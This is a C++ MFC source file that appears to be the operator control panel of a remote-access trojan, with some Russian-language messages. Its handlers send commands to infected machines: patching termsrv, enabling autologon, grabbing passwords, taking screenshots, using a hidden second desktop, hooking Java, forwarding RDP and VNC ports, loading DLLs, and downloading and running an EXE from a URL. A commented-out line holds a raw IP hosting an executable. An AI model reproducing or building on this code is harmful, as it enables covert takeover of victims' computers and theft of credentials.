		m_pClient->RequestRun(r.sw_run_IE_FF,(LPCTSTR)(r.m_ComL),(LPCTSTR)(r.m_ExeFile), r.dwHost, r.sw_shell, !r.sw_run_withIE);
		Log( L"Request to run has been sent..." );
	}


}


void CClientDlg::OnBnClickedPatchStatus()
{
	m_pClient->RequestPatchInfo();
	Log( L"Getting patch info..." );
}

void CClientDlg::OnBnClickedPatchJava()
{
	if( m_pClient->RequestPatchStart() )
	{
		Log( L"Starting patch..." );
	}
	else
	{
		MessageBox( L"Can't start patch, file not found." );
	}
}

void CClientDlg::OnBnClickedCmdMin()
{
	int iItem = m_TextWinList1.GetCurSel( );
	if( iItem >= 0 )
	{
		DWORD_PTR id = m_TextWinList1.GetItemData1( iItem );
		m_pClient->RequestWinCmd( id, SC_MINIMIZE );
		Log( L"Sending system command to [%08X]...", id );
	}
}

void CClientDlg::OnBnClickedCmdMax()
{
	int iItem = m_TextWinList1.GetCurSel( );
	if( iItem >= 0 )
	{

		DWORD_PTR id = m_TextWinList1.GetItemData1( iItem );
		m_pClient->RequestWinCmd( id, SC_MAXIMIZE );
		Log( L"Sending system command to [%08X]...", id );
	}
}

void CClientDlg::OnBnClickedHookApp()
{
	CButton *chB_HookJava = (CButton *) (this->GetDlgItem(IDC_MOVE));
	if(!chB_HookJava->GetCheck())
	{
		chB_HookJava->SetCheck(true);
		m_pClient->RequestWinCmd( 0, PK_SC_SOUND_OFF );
	}


	int iItem = m_TextWinList1.GetCurSel( );
	if( iItem >= 0 )
	{
		DWORD_PTR id = m_TextWinList1.GetItemData1( iItem );
		m_pClient->RequestRun(id,L"",L"", -1, 0, 1);
		Log( L"Request to hook has been sent..." );
	}
}

void CClientDlg::OnBnClickedSetOptions()
{
		m_pClient->RequestSetOptions(false, 0, 0, 0, 0,0,0,NULL,NULL,NULL,NULL );
		Log( L"Options has been sent..." );
}

void CClientDlg::OnBnClickedButton1()
{
	int iItem = m_TextWinList1.GetCurSel( );
	if( iItem >= 0 )
	{
		DWORD_PTR id = m_TextWinList1.GetItemData1( iItem );
		SendToForm r;// = new SendToForm();
		m_pClient->RequestNamesControl(id);
	}
	// TODO: Add your control notification handler code here
}

void CClientDlg::OnBnClickedButton2()
{
	int iItem = m_TextWinList1.GetCurSel( );
	if( iItem >= 0 )
	{
		DWORD_PTR id = m_TextWinList1.GetItemData1( iItem );
		m_pClient->CloseWindow(id);
	}
	// TODO: Add your control notification handler code here
}

void CClientDlg::OnBnClickedCheck1()
{
	CMenu* pMenu = GetMenu();

	if(pMenu)
	{
		UINT state = pMenu->GetMenuState(ID_OPTIONS_DBCLICK, MF_BYCOMMAND);
		if(state == 0xFFFFFFFF)
			return;

		if (state & MF_CHECKED)
		{
			pMenu->CheckMenuItem(ID_OPTIONS_DBCLICK, MF_UNCHECKED | MF_BYCOMMAND);
		}
		else
		{
			pMenu->CheckMenuItem(ID_OPTIONS_DBCLICK, MF_CHECKED | MF_BYCOMMAND);
		}

	}
}


HANDLE AutoUpdThread;
DWORD LPForThred;
HANDLE hEvent;
DWORD WINAPI CClientDlg::UpdateThread( LPVOID lpThreadParameter )
{
	CClientDlg *tmp=(CClientDlg *)lpThreadParameter;
	int iSleep=tmp->m_pClient->AutoUpdate;
	while (WaitForSingleObject(hEvent,1000*iSleep)!=WAIT_OBJECT_0)
	{
		tmp->m_pClient->RequestWindowList();
		iSleep=tmp->m_pClient->AutoUpdate;
	}

	return 0;
}


void CClientDlg::OnBnClickedCheck2()
{

	CMenu* pMenu = GetMenu();

	if(pMenu)
	{
		UINT state = pMenu->GetMenuState(ID_OPTIONS_AUTOUPDATE, MF_BYCOMMAND);
		if(state == 0xFFFFFFFF)
			return;

		if (state & MF_CHECKED)
		{
			pMenu->CheckMenuItem(ID_OPTIONS_AUTOUPDATE, MF_UNCHECKED | MF_BYCOMMAND);
			int i=200;
			SetEvent(hEvent);
			Sleep(1000);
			ResetEvent(hEvent);
			CloseHandle(hEvent);
		}
		else
		{
			pMenu->CheckMenuItem(ID_OPTIONS_AUTOUPDATE, MF_CHECKED | MF_BYCOMMAND);
			hEvent=CreateEvent(NULL,TRUE,FALSE,L"FirstStep");
			AutoUpdThread=CreateThread(0,0,UpdateThread,this,0,&LPForThred);
		}
	}

}


void CClientDlg::OnBnClickedButton5()
{
	m_pClient->RequestWinCmd(0, PK_SC_RUNSOUND );
}

void CClientDlg::OnBnClickedHookJava()
{
	CButton *chB_HookJava = (CButton *) (this->GetDlgItem(IDC_HOOK_JAVA));
	if(chB_HookJava->GetCheck())
	{
		m_pClient->RequestResumeJava();
	}
	else
	{
		m_pClient->RequestSuspendJava();
	}
}

void CClientDlg::OnBnClickedCmdShow()
{
	int iItem = m_TextWinList1.GetCurSel( );
	if( iItem >= 0 )
	{
		DWORD_PTR id = m_TextWinList1.GetItemData1( iItem );
		m_pClient->RequestWinCmd( id, PK_SC_SHOW );
		Log( L"Sending show command to [%08X]...", id );
	}
}

void CClientDlg::OnBnClickedCmdHide()
{
	int iItem = m_TextWinList1.GetCurSel( );
	if( iItem >= 0 )
	{
		DWORD_PTR id = m_TextWinList1.GetItemData1( iItem );
		m_pClient->RequestWinCmd( id, PK_SC_HIDE );
		Log( L"Sending hide command to [%08X]...", id );
	}
}

void CClientDlg::OnBnClickedCmdShow2()
{
	CMenu* pMenu = GetMenu();

	if(pMenu)
	{
		UINT state = pMenu->GetMenuState(ID_JAVA_HIDESHOWJAVATRAY, MF_BYCOMMAND);
		if(state == 0xFFFFFFFF)
			return;

		if (state & MF_CHECKED)
		{
			pMenu->CheckMenuItem(ID_JAVA_HIDESHOWJAVATRAY, MF_UNCHECKED | MF_BYCOMMAND);
			m_pClient->RequestWinCmd( NULL, PK_SC_SHOW_JAVA_TRAY );
		}
		else
		{
			pMenu->CheckMenuItem(ID_JAVA_HIDESHOWJAVATRAY, MF_CHECKED | MF_BYCOMMAND);
			m_pClient->RequestWinCmd( NULL, PK_SC_HIDE_JAVA_TRAY );
		}

	}

}



void CClientDlg::OnBnClickedButton4()
{
	CMenu* pMenu = GetMenu();
	BOOL isCheck;
	if(pMenu)
	{
		UINT state = pMenu->GetMenuState(ID_OPTIONS_DELLFILE, MF_BYCOMMAND);
		if(state == 0xFFFFFFFF)
			return;

		if (state & MF_CHECKED)
			isCheck=true;
		else
			isCheck=false;
	}

	m_TextWinList1.SetCurSel(-1);
	{
		m_pClient->RequestWinShot( 0 ,isCheck );
		Log( L"Getting screenshot of [%08X]...", 0 );
	}
}

void CClientDlg::OnAccelerator_F4()
{
	OnBnClickedButton4();
	// TODO: Add your command handler code here
}

void CClientDlg::OnAccelerator32772()
{
	ModifyStyleEx(WS_OVERLAPPED ,WS_POPUP/*|WS_SYSMENU*/, SWP_FRAMECHANGED );

	int x = GetSystemMetrics( SM_CXSCREEN );
	int y = GetSystemMetrics( SM_CYSCREEN );

	ShowWindow(SW_MAXIMIZE);
	m_PlaceKeeper.SetFullScrElement(0,true);
	m_PlaceKeeper.UpdatePositions();

}

void CClientDlg::OnAccelerator32774()
{
	m_PlaceKeeper.SetFullScrElement(0,false);
	m_PlaceKeeper.UpdatePositions();
	// TODO: Add your command handler code here
}

void CClientDlg::OnLbnSelchangeList1()
{
	OnLbnSelchangeWindowList();
	// TODO: Add your control notification handler code here
}

void CClientDlg::OnAccelerator32776()
{
	// TODO: Add your command handler code here
}

void CClientDlg::OnBnClickedCreateVpnXxx()
{
	CIPDialog IPd;
	if(IPd.DoModal() == IDOK)
		m_pClient->RequestWinCmd(NULL, PK_SC_CREATE_VPN, (BYTE*)&IPd.IP[0], (wcslen(&IPd.IP[0])+1)*sizeof(WCHAR));
}

void CClientDlg::OnRdpCreatevpnmanualy()
{
	CIPDialog IPd;
	if(IPd.DoModal() == IDOK)
		m_pClient->RequestWinCmd(NULL, PK_SC_CREATE_VPN_MANUALY, (BYTE*)&IPd.IP[0], (wcslen(&IPd.IP[0])+1)*sizeof(WCHAR));
}

void CClientDlg::OnBnClickedOpenVpnXxx()
{
	m_pClient->RequestWinCmd(NULL, PK_SC_OPEN_VPN);
}

void CClientDlg::OnBnClickedCloseVpnXxx()
{
	m_pClient->RequestWinCmd(NULL, PK_SC_CLOSE_VPN);
}


void CClientDlg::OnBnClickedPatch()
{
	m_pClient->RequestWinCmd(NULL, PK_SC_PATCH_TERMSRV);
}

void CClientDlg::OnBnClickedReboot()
{
	m_pClient->RequestWinCmd(NULL, PK_SC_REBOOT);
}

void CClientDlg::OnBnClickedPass()
{
	m_pClient->RequestWinCmd(NULL, PK_SC_PASSWORD);
}

void CClientDlg::OnBnClickedCmdDesk1()
{
	m_pClient->RequestWinCmd(NULL, PK_SC_SWITCH_DESK_1);
	SetDlgItemText(IDC_STATIC_DESK, L"1");
	Sleep(200);
	OnBnClickedRefreshBtn();
}

void CClientDlg::OnBnClickedCmdDesk2()
{
	m_pClient->RequestWinCmd(NULL, PK_SC_SWITCH_DESK_2);
	SetDlgItemText(IDC_STATIC_DESK, L"2");
	Sleep(200);
	OnBnClickedRefreshBtn();
}


void CClientDlg::OnBnClickedAutologonCheck()
{
	m_pClient->RequestWinCmd(NULL, PK_SC_AUTOLOGON_CHECK);
}

void CClientDlg::OnBnClickedAutologonOn()
{
	CMenu* pMenu = GetMenu();

	if(pMenu)
	{
		UINT state = pMenu->GetMenuState(ID_TOOLS_AUTOLOGONON, MF_BYCOMMAND);
		if(state == 0xFFFFFFFF)
			return ;

		if (state & MF_CHECKED)
		{
			pMenu->CheckMenuItem(ID_TOOLS_AUTOLOGONON, MF_UNCHECKED | MF_BYCOMMAND);
			m_pClient->RequestWinCmd(NULL, PK_SC_AUTOLOGON_OFF);
		}
		else
		{
			pMenu->CheckMenuItem(ID_TOOLS_AUTOLOGONON, MF_CHECKED | MF_BYCOMMAND);
			m_pClient->RequestWinCmd(NULL, PK_SC_AUTOLOGON_ON);
		}
	}

}

void CClientDlg::OnToolsAutologonoff()
{
	m_pClient->RequestWinCmd(NULL, PK_SC_AUTOLOGON_OFF);
}

void CClientDlg::OnComandMaximize()
{
	// TODO: Add your command handler code here
}

void CClientDlg::OnBnClickedCheck3()
{
	CMenu* pMenu = GetMenu();

	if(pMenu)
	{
		UINT state = pMenu->GetMenuState(ID_OPTIONS_DELLFILE, MF_BYCOMMAND);
		if(state == 0xFFFFFFFF)
			return;

		if (state & MF_CHECKED)
		{
			pMenu->CheckMenuItem(ID_OPTIONS_DELLFILE, MF_UNCHECKED | MF_BYCOMMAND);
			m_pClient->RequestWinCmd(NULL, PK_SC_JAVAMOVE);
		}
		else
		{
			pMenu->CheckMenuItem(ID_OPTIONS_DELLFILE, MF_CHECKED | MF_BYCOMMAND);
			m_pClient->RequestWinCmd(NULL, PK_SC_JAVAMOVE);
		}

	}
}

void CClientDlg::OnJavaMovejava()
{
	CMenu* pMenu = GetMenu();

	if(pMenu)
	{
		UINT state = pMenu->GetMenuState(ID_JAVA_MOVEJAVA, MF_BYCOMMAND);
		if(state == 0xFFFFFFFF)
			return;

		if (state & MF_CHECKED)
		{
			pMenu->CheckMenuItem(ID_JAVA_MOVEJAVA, MF_UNCHECKED | MF_BYCOMMAND);
			m_pClient->RequestWinCmd(NULL, PK_SC_JAVAMOVE);
		}
		else
		{
			pMenu->CheckMenuItem(ID_JAVA_MOVEJAVA, MF_CHECKED | MF_BYCOMMAND);
			m_pClient->RequestWinCmd(NULL, PK_SC_JAVAMOVE);
		}

	}
}

void CClientDlg::OnOptionsFulllistofwindows()
{
	CMenu* pMenu = GetMenu();

	if(pMenu)
	{
		UINT state = pMenu->GetMenuState(ID_OPTIONS_FULLLISTOFWINDOWS, MF_BYCOMMAND);
		if(state == 0xFFFFFFFF)
			return;

		if (state & MF_CHECKED)
		{
			pMenu->CheckMenuItem(ID_OPTIONS_FULLLISTOFWINDOWS, MF_UNCHECKED | MF_BYCOMMAND);
			m_pClient->RequestWinCmd(NULL, PK_SC_SHOWALLWINDOWS);
		}
		else
		{
			pMenu->CheckMenuItem(ID_OPTIONS_FULLLISTOFWINDOWS, MF_CHECKED | MF_BYCOMMAND);
			m_pClient->RequestWinCmd(NULL, PK_SC_SHOWALLWINDOWS);
		}

	}
}

void CClientDlg::OnComandRemotereboot2()
{
	m_pClient->RequestWinCmd(NULL, PK_SC_REMOTE_REBOOT2);
}

void CClientDlg::OnBnClickedSs()
{
	HDESK hSecondDesktop=CreateDesktopW(L"SecondDesktop",NULL,NULL,DF_ALLOWOTHERACCOUNTHOOK,GENERIC_ALL,NULL);
	if(hSecondDesktop == NULL)
	{
		DWORD err = GetLastError();
		WCHAR msg[100];
		wsprintf(&msg[0], L"CreateDesktop ERROR: %d", err);
		MessageBoxW(&msg[0]);
		//DbgMsgW(L"ClientDlg.cpp", err, L"ERROR");
	}
	/*HDESK hDesktop_cur = GetThreadDesktop(GetCurrentThreadId());
	if(hDesktop_cur != hSecondDesktop && hDesktop_cur != NULL)
		hFirstDesktop = hDesktop_cur;*/
	HDESK hCurrDesk = GetThreadDesktop(GetCurrentThreadId());
	SwitchDesktop(hSecondDesktop);
	Sleep(5000);
	SwitchDesktop(hCurrDesk);
}

void CClientDlg::OnRdpConnectionstate()
{
	m_pClient->RequestWinCmd(NULL, PK_SC_VPN_STATE);
}

void CClientDlg::OnRdpDeletevpn()
{
	m_pClient->RequestWinCmd(NULL, PK_SC_DELETE_VPN);
}

void CClientDlg::OnBnClickedMove()
{
	CButton *chB_HookJava = (CButton *) (this->GetDlgItem(IDC_MOVE));
			if(chB_HookJava->GetCheck())
			{
				//chB_HookJava->SetCheck(true);
				m_pClient->RequestWinCmd( 0, PK_SC_SOUND_OFF );

			}
			else
			{
				m_pClient->RequestWinCmd( 0, PK_SC_SOUND_ON );
			}

}

void CClientDlg::OnOptionsHidefromseconddesc()
{

	CMenu* pMenu = GetMenu();

	if(pMenu)
	{
		UINT state = pMenu->GetMenuState(ID_OPTIONS_HIDEFROMSECONDDESC, MF_BYCOMMAND);
		if(state == 0xFFFFFFFF)
			return;

		if (state & MF_CHECKED)
		{
			pMenu->CheckMenuItem(ID_OPTIONS_HIDEFROMSECONDDESC, MF_UNCHECKED | MF_BYCOMMAND);
			m_pClient->RequestWinCmd(NULL, PK_SC_HIDEFROMSECONDDESC_OFF);
		}
		else
		{
			pMenu->CheckMenuItem(ID_OPTIONS_HIDEFROMSECONDDESC, MF_CHECKED | MF_BYCOMMAND);
			m_pClient->RequestWinCmd(NULL, PK_SC_HIDEFROMSECONDDESC_ON);
		}

	}
}

void CClientDlg::OnBnClickedDconfig()
{
#ifdef FullVersion
	WCHAR FileName[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,&FileName[0]);
	wcscat(FileName, L"\\");
	wcscat(FileName, L"igfxtrayhp.dat");


	m_pClient->RequestUploadStart(FileName,L"!igfxtrayhp.dat");
	m_pClient->RequestWinCmd(NULL, PK_SC_HIDEFROMSECONDDESC_ON);
	// TODO: Add your control notification handler code here
#endif
}

void CClientDlg::OnComandCloseSb()
{
	m_pClient->RequestCLOSE_SB_NOW();
	// TODO: Add your command handler code here
}

void CClientDlg::OnRdpLoaddll()
{
	m_pClient->RequestUploadStartData();
	// TODO: Add your command handler code here
}

void CClientDlg::OnRdpClosedll()
{
	m_pClient->RequestCloseDLL();
	// TODO: Add your command handler code here
}

void CClientDlg::OnRdpPortforw()
{
	RDP_InputData pWind;
	if (pWind.DoModal() )
	{

		int port = m_pClient->RequestPortForw(pWind.Port);
		if( port == 0 )
			::MessageBox( 0, L"Не удалось выделить порт", L"Ошибка", 0 );
		else
		{
			WCHAR buf[100];
			wsprintf( buf, L"Открыт порт: %d", port );
			::MessageBox( 0, buf, L"Сообщение", 0 );
		}
	}
}

void CClientDlg::OnVncStart()
{
	m_pClient->RequestUploadStartDataVNC();
	//m_pClient->RequestWinCmd(NULL, PK_SC_ANCStat);
	// TODO: Add your command handler code here
}

void CClientDlg::OnVncStop()
{
	m_pClient->RequestWinCmd(NULL, PK_SC_ANCStop);
	// TODO: Add your command handler code here
}

void CClientDlg::OnBnClickedButtonTest()
{
	//m_pClient->RequestUploadStartDataVNC();
	// TODO: Add your control notification handler code here
}

void CClientDlg::OnPortforwardingVnc()
{
	int port = m_pClient->RequestPortForw(5900);
		if( port == 0 )
			::MessageBox( 0, L"Не удалось выделить порт", L"Ошибка", 0 );
		else
		{
			WCHAR buf[100];
			wsprintf( buf, L"Открыт порт: %d", port );
			::MessageBox( 0, buf, L"Сообщение", 0 );
		}
}

void CClientDlg::OnPortforwardingRdp()
{
	int port = m_pClient->RequestPortForw(3389);
		if( port == 0 )
			::MessageBox( 0, L"Не удалось выделить порт", L"Ошибка", 0 );
		else
		{
			WCHAR buf[100];
			wsprintf( buf, L"Открыт порт: %d", port );
			::MessageBox( 0, buf, L"Сообщение", 0 );
		}
}

void CClientDlg::OnComandRunexe()
{
	URLInput dlg;
	if (dlg.DoModal())
	{
		//char dat[]="http://94.240.148.127/cfg/NOTEPAD.EXE\0";
		m_pClient->RequestWinCmd(0, PK_SC_DOWNLOADAndRunEXE,(BYTE*)dlg.URL,strlen(dlg.URL)+1);
	// TODO: Add your command handler code here
	}
}

void CClientDlg::OnLButtonDown(UINT nFlags, CPoint point)
{
	// TODO: Add your message handler code here and/or call default

	CDialog::OnLButtonDown(nFlags, point);
}
